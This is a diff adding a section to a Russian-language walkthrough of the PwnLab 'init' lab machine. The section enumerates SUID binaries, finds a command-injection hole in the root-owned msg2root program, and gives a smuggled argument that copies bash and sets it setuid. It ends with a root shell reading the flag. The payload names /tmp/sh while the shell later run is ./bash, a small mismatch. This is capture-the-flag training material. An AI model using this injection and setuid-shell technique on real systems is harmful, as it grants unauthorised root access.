@@ -693,11 +693,107 @@ mike@pwnlab:/tmp$
 
 ```
 
+`linpeas` у Майка работать не захотел, вручную ищу вектора  
+```bash
+mike@pwnlab:/tmp$ sudo -l
+sudo -l
+bash: sudo: command not found
+mike@pwnlab:/tmp$ find / -type f -perm -04000 -ls 2>/dev/null
+find / -type f -perm -04000 -ls 2>/dev/null
+  3603   36 -rwsr-xr-x   1 root     root        34684 Mar 29  2015 /bin/mount
+  4989   40 -rwsr-xr-x   1 root     root        38868 Nov 19  2015 /bin/su
+  3604   28 -rwsr-xr-x   1 root     root        26344 Mar 29  2015 /bin/umount
+ 18810   96 -rwsr-xr-x   1 root     root        96760 Aug 13  2014 /sbin/mount.nfs
+ 27220    8 -rwsr-sr-x   1 root     root         5364 Mar 17  2016 /home/mike/msg2root
+ 27221    8 -rwsr-sr-x   1 mike     mike         5148 Mar 17  2016 /home/kane/msgmike
+  5009   40 -rwsr-xr-x   1 root     root        38740 Nov 19  2015 /usr/bin/newgrp
+   354   52 -rwsr-xr-x   1 root     root        52344 Nov 19  2015 /usr/bin/chfn
+ 17895   52 -rwsr-sr-x   1 daemon   daemon      50644 Sep 30  2014 /usr/bin/at
+   358   52 -rwsr-xr-x   1 root     root        53112 Nov 19  2015 /usr/bin/passwd
+ 18898   96 -rwsr-sr-x   1 root     mail        96192 Feb 11  2015 /usr/bin/procmail
+   355   44 -rwsr-xr-x   1 root     root        43576 Nov 19  2015 /usr/bin/chsh
+   357   80 -rwsr-xr-x   1 root     root        78072 Nov 19  2015 /usr/bin/gpasswd
+ 11725    8 -rwsr-xr-x   1 root     root         5372 Feb 24  2014 /usr/lib/eject/dmcrypt-get-device
+  2813   12 -rwsr-xr-x   1 root     root         9540 Feb 11  2016 /usr/lib/pt_chown
+ 18078  356 -rwsr-xr--   1 root     messagebus   362672 Aug  2  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+ 18859  552 -rwsr-xr-x   1 root     root       562536 Jan 13  2016 /usr/lib/openssh/ssh-keysign
+ 17980 1060 -rwsr-xr-x   1 root     root      1085236 Mar 13  2016 /usr/sbin/exim4
+mike@pwnlab:/tmp$ 
+```
+
+Выполняю `/home/mike/msg2root`  
+```bash
+mike@pwnlab:/tmp$ /home/mike/msg2root
+/home/mike/msg2root
+Message for root: test
+test
+mike@pwnlab:/tmp$ strings /home/mike/msg2root
+```
+
+И нахожу там такие строки  
+```bash
+[^_]
+Message for root: 
+/bin/echo %s >> /root/messages.txt
+;*2$"(
+```
+
+Похоже, что если я передам `test; cp /bin/bash /tmp/sh; chmod +s /tmp/sh; /bin/echo nothing > /dev/null`  
+то выполнится следующая череда команд с правами **root**  
+```bash
+/bin/echo test; cp /bin/bash /tmp/sh; chmod +s /tmp/sh; /bin/echo nothing > /dev/null >> /root/messages.txt
+```
 
 ## 🏁 Флаги
 
-- User flag: 
-- Root flag: 
+Важно использовать не `cat`, который я ранее подменил, а `/bin/cat` для чтения флага  
+```bash
+mike@pwnlab:/tmp$ ./bash -p
+./bash -p
+bash-4.3# id
+id
+uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)
+bash-4.3# cd /root 
+cd /root
+bash-4.3# ls -la
+ls -la
+total 20
+drwx------  2 root root 4096 Mar 17  2016 .
+drwxr-xr-x 21 root root 4096 Mar 17  2016 ..
+lrwxrwxrwx  1 root root    9 Mar 17  2016 .bash_history -> /dev/null
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+----------  1 root root 1840 Mar 17  2016 flag.txt
+lrwxrwxrwx  1 root root    9 Mar 17  2016 messages.txt -> /dev/null
+lrwxrwxrwx  1 root root    9 Mar 17  2016 .mysql_history -> /dev/null
+-rw-r--r--  1 root root  140 Nov 19  2007 .profile
+bash-4.3# /bin/cat flag.txt
+/bin/cat flag.txt
+.-=~=-.                                                                 .-=~=-.
+(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
+(_ ___)  _____                             _                            (_ ___)
+(__  _) /  __ \                           | |                           (__  _)
+( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
+(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
+(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
+(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
+( _ __)                     __/ |                                       ( _ __)
+(__  _)                    |___/                                        (__  _)
+(__  _)                                                                 (__  _)
+(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
+( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
+(__  _) this challenge.                                                 (__  _)
+(_ ___)                                                                 (_ ___)
+( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
+(__  _) reading it                                                      (__  _)
+(__  _)                                                                 (__  _)
+(__  _)                                             For sniferl4bs.com  (__  _)
+( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
+(__  _)                                                                 (__  _)
+(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
+`-._.-'                                                                 `-._.-'
+bash-4.3# 
+```
+
 
 ---
 
